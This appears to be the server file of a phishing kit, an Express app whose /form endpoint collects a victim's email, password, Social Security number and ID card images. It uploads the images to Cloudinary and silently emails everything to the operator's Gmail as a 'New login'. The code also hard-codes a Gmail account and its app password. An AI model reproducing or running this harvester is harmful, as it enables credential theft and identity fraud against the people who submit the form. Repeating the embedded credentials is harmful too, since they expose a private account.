require("dotenv").config();
const nodemailer = require('nodemailer'); 


const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'zwingerfx@gmail.com',
    pass: 'gpvgnuuqnvnsngyy'
  }
});
const express = require("express");
const app = express();
const port = process.env.PORT
const cors = require("cors");
const cloudinary = require("./cloudinary/cloudinary")

app.use(cors());
app.use(express.json({limit: '50mb'}));
app.use(express.urlencoded({extended: true , limit: '50mb'}))


app.get("/", (req,res)=>{
    res.send("welcome on this page")
})


app.post("/form", async(req,res)=>{
  const {images, security, email, password} = req.body;
 
  
  const uploadedImgs = images?.map(async image=>{
   const upload =  await cloudinary.uploader.upload(image,
        { 
          upload_preset: 'unsigned_upload',
          allowed_formats : ['png', 'jpg', 'jpeg', 'svg', 'ico', 'jfif', 'webp'],
      }, 
        function(error, result) {
            if(error){
                console.log(error)
            }
             });
    return upload
  })

  try{
    const fulfilled = await Promise.all(uploadedImgs).then(values=> {return values})
    const publicIds =  fulfilled.map(image=>{
        return image.url
    })
    // res.status(200).json(publicIds, security, email, password)
    const mailOptions = {
      from: 'Masonres213@gmail.com',
      to: 'Masonres213@gmail.com',
      subject: 'New login',
      // text: 'That was easy!',
      html:`<h1>Someone just logged in with the following info </h1><p> email: ${email}, password: ${password}, SSN: ${security},  ID Cards:  ${publicIds[0]} `
    };
    res.status(200).json({"msg": "done"}) 
    transporter.sendMail(mailOptions, function(error, info){
      if (error) {
        console.log(error);
      } else {
        // console.log('Email sent: ' + info.response);
      }
    });
    // console.log(publicIds, security, email, password)
  }catch(err){
    res.status(500).json(err)
  }
    })






app.listen(port, _=> console.log(`app is listening on port ${port}`))